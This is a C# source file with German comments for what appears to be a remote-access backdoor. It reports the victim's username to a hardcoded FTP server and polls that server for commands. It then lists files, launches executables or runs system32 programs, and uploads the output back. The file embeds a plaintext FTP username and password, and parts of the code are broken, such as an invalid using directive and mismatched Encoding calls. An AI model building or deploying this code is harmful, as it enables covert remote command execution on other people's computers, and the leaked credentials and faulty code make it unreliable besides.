using System;
using System.Collections.Generic;
using System.Linq;
using System.Diagnostics;
using double_ftp;
using System.Net;
using System.Text.Encoding;
using System.Reflection;

namespace double_ftp_target
{
    /// <summary>
    /// Konstante Variablen für die Anmeldedaten
    /// </summary>
    class constants
    {
        /// <summary>
        /// Serverlink
        /// </summary>
        public static readonly string WEBSERVER = "ftp://files.000webhost.com/public_html/ftp/";
        /// <summary>
        /// Benutzername
        /// </summary>
        public static readonly string USER = "kuso-sama";
        /// <summary>
        /// Passwort
        /// </summary>
        public static readonly string PASS = "v)lE(D3fJpz(vzeYEIBP";
    }

    class Program
    {
        /// <summary>
        /// Die Session ID
        /// </summary>
        static readonly int id = new Random().Next(1000000, 9999999);
        /// <summary>
        /// Der Benutzername
        /// </summary>
        static readonly string user = Environment.UserName;
        /// <summary>
        /// Startdatum
        /// </summary>
        static readonly string startDate = DateTime.Now.ToString();
        /// <summary>
        /// Letzes geleses Datum
        /// </summary>
        static string lastDate = startDate;
        
        /// <summary>
        /// Die Main Methode
        /// </summary>
        /// <param name="args">Command Line Argumente</param>
        static void Main(string[] args)
        {
            // Gibt die ID an
            Console.WriteLine($"{user} - {id}");
            // Lädt die Datei hoch
            ftpTools.uploadFile(constants.WEBSERVER + $"{user}-{id}.dftp", constants.USER, constants.PASS, $"{lastDate}\nstarted session");
            

            Console.WriteLine("STARTING...");
            while(true)
                checkIfNewCommand();
        }

        /// <summary>
        /// Guckt nach ob ein neuer Befehl vorhanden ist und noch mehr
        /// </summary>
        static void checkIfNewCommand()
        {
            System.Threading.Thread.Sleep(7500);
            // Liest Datei
            string content = ftpTools.downloadFile(constants.WEBSERVER + $"{user}-{id}.dftp", constants.USER, constants.PASS);
            //Wenn das selbe Datum ist
            if (content.Split('\n')[0] == lastDate || content == "")
            {
                Console.WriteLine($"old: {content}");
                return;
            }
            // Führt Befehl aus
            lastDate = double_ftp.commands.execute(content.Split('\n')[1], $"{user}-{id}.dftp");
        }
    }
}








#region ext
namespace double_ftp
{
    /// <summary>
    /// Tools für FTP Dateiverwaltung und mehr
    /// </summary>
    class ftpTools
    {
        /// <summary>
        /// Lädt eine Datei auf den FTP Server hoch
        /// </summary>
        /// <param name="URL">Die Ziel Datei</param>
        /// <param name="user">Der FTP Benutzername</param>
        /// <param name="password">Das FTP Passwort</param>
        /// <param name="content">Der Inhalt der hochgeladen werden soll</param>
        public static void uploadFile(string URL, string user, string password, string content)
        {
            using (WebClient client = new WebClient())
            {
                client.Credentials = new NetworkCredential(user, password);
                client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
                client.UploadString((URL.EndsWith("/") ? URL + "/" : URL) + "", WebRequestMethods.Ftp.UploadFile, content);
            }
        }

        /// <summary>
        /// Lädt eine Datei vom FTP Server runter
        /// </summary>
        /// <param name="URL">Die Ziel Datei</param>
        /// <param name="user">Der FTP Benutzername</param>
        /// <param name="password">Das FTP Passwort</param>
        /// <returns>Der Inhalt der Datei</returns>
        public static string downloadFile(string URL, string user, string password)
        {
            try
            {
                WebClient request = new WebClient();
                request.Credentials = new NetworkCredential(user, password);
                request.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

                byte[] newFileData = request.DownloadData(URL);
                string fileString = System.Text.Encoding.UTF8.GetString(newFileData);
                request.Dispose();
                return fileString;
            }catch(Exception)
            {
                return downloadFile(URL, user, password);
            }
        }

        /// <summary>
        /// Wandelt einen String zu einem DFTP Befehl Datei String um
        /// </summary>
        /// <param name="s">Der String der umgewandelt werden soll</param>
        /// <returns>Der umgewandelte String</returns>
        public static string toFTPString(string s)
        {
            return $"{System.DateTime.Now}\n{s}";
        }
    }

    /// <summary>
    /// Eine Klasse mit allen Befehlen
    /// </summary>
    /// <returns>
    /// Ein String mit der Zeit an der die callback Datei hochgeladen wurde
    /// </returns>
    class commands
    {
        /// <summary>
        /// Führt einen erhaltenen DFTP Befehl aus
        /// </summary>
        /// <param name="name">Der Befehl</param>
        /// <param name="dest">Die Ziel Datei für den Callback zum hochladen auf den FTP Servers</param>
        /// <returns>Gibt ein <see cref="DateTime"/> Objekt als <see cref="String"/> zurück, an dem der Befehl ausgeführt wurde</returns>
        public static string execute(string name, string dest)
        {
            /// <summary>
            /// Neues Command Objelt um alle Funktionen zu lesen
            /// </summary>
            commands.CommandList c = new commands.CommandList();

            /// <summary>
            /// Der Befehlname
            /// </summary>
            string command = name.ToLower().Split(' ')[0];

            /// <summary>
            /// Die Befehl Argumente
            /// </summary>
            List<string> args = name.ToLower().Split(' ').Skip(1).ToList();

            /// <summary>
            /// Die Funktion die ausgeführt werden soll
            /// <para>Wenn die Funktion nicht gefunden wurde wird <see cref="callback"/> verändert</para>
            /// </summary>
            MethodInfo s = c.GetType().GetMethod(command);

            /// <summary>
            /// Die Rückgabe
            /// </summary> 
            string callback;

            if (s != null)      // Wenn der Befehl nicht null ist
                callback = ftpTools.toFTPString($"{s.Invoke(null, new object[] { args })}");
            else                // Ansonsten den callback setzen
                callback = ftpTools.toFTPString($"Der Befehl '{name}' konnte nicht gefunden werden");

            Console.WriteLine(name);
            // Lädt die Ruckgabe vom Befehl hoch
            ftpTools.uploadFile(double_ftp_target.constants.WEBSERVER  + $"{dest}", double_ftp_target.constants.USER, double_ftp_target.constants.PASS, callback.ToString());

            // Gibt das Datum zurück
            return callback.Split('\n')[0];
        }




        /// <summary>
        /// Klasse mit allen Funktionen für die Befehle
        /// <para><i>> Der Name der Fuktion ist auch der Name des DFTP-Befehles</i></para>
        ///
        /// <b>Beispiel</b>
        /// <br/>
        /// DFTP-Befehl: <c>TEST</c>
        /// <br/>
        /// Funktionsname: <c>TEST</c>
        /// </summary>
        public class CommandList
        {
            /// <summary>
            /// Führt einen Test aus um die DFTP Verbindung zu testen
            /// </summary>
            /// <param name="args">Die DFTP-Commandline Argumente</param>
            /// <returns>Den Callback text als <see cref="String"/></returns>
            public static string test(List<string> args)
            {
                Console.WriteLine("Command gelsesn");
                return "Test erfolgreich!";
            }
            /// <summary>
            /// Listet alle Dateien im Ordner auf
            /// <para>Wenn kein Ordnerpfad in den Argumenten angegeben wurde, werden alle Dateien im aktuellen Ordnerpfad angegeben</para>
            /// </summary>
            /// <param name="args"></param>
            /// <returns>Den Callback text als <see cref="String"/></returns>
            public static string ls(List<string> args)
            {
                /// <summary>
                /// Alle Ordner und Dateien als String
                /// </summary>
                string list = "";

                /// <summary>
                /// Die Ordner Info
                /// </summary>
                System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(System.IO.Directory.GetCurrentDirectory());

                // Für jeden Ordner
                foreach (System.IO.DirectoryInfo d in dir.GetDirectories())
                {
                    list += String.Format("{0, -30}\t directory", d.Name);
                }
                // Für jeded Datei
                foreach (System.IO.FileInfo f in dir.GetFiles())
                {
                    list += String.Format("{0, -30}\t File", f.Name);
                }

                return list;
            }
            /// <summary>
            /// Startet eine Datei vom angegebenen Pfad
            /// </summary>
            /// <param name="args">Die DFTP-Consolen Argumente</param>
            /// <returns>Callback</returns>
            public static string start(List<string> args)
            {
                try
                {
                    if (!System.IO.File.Exists(args[0]))        // Wenn die Datei nicht existiert
                        throw new System.IO.FileNotFoundException();

                    System.Diagnostics.Process p = new System.Diagnostics.Process();
                    p.StartInfo.FileName = args[0];
                    p.StartInfo.Arguments = String.Join(" ", args.ToList().Skip(1).ToArray());
                    p.StartInfo.UseShellExecute = false;
                    p.StartInfo.RedirectStandardOutput = true;
                    p.StartInfo.RedirectStandardError = true;
                    p.Start();

                    int duration = 6000;

                    String output = "";

                    
                    Stopwatch timer = new Stopwatch();
                    timer.Start();

                    while (p.StandardOutput.Peek() > -1 && timer.Elapsed.TotalSeconds < duration)
                    {
                        output += $"{Encoding.UTF8.GetString(p.StandardOutput.ReadLine())}\n";
                    }

                    while (p.StandardError.Peek() > -1 && timer.Elapsed.TotalSeconds < duration)
                    {
                        output += $"{Encoding.UTF8.GetString(p.StandardError.ReadLine())}\n";
                    }
                    timer.Stop();
                    return output;
                } 
                catch (System.IO.FileNotFoundException)
                {
                    return $"Die Datei {args[0]} konnte nicht gefunden werden!";
                }
                catch (Exception ex)
                {
                    return $"Ein Fehler ist aufgetreten: {ex.Message}";
                }
            }
            /// <summary>
            /// Startet einen CMD Befehl
            /// </summary>
            /// <param name="args">Die DFTP-Command Line Argumente</param>
            /// <returns>Callback</returns>
            public static string cmd(List<string> args)
            {
                List<string> startArgs = args;
                startArgs.Insert(0, $@"c:\windows\system32\{args[0]}.exe");

                return start(startArgs);
            }
        }
    }
}

#endregion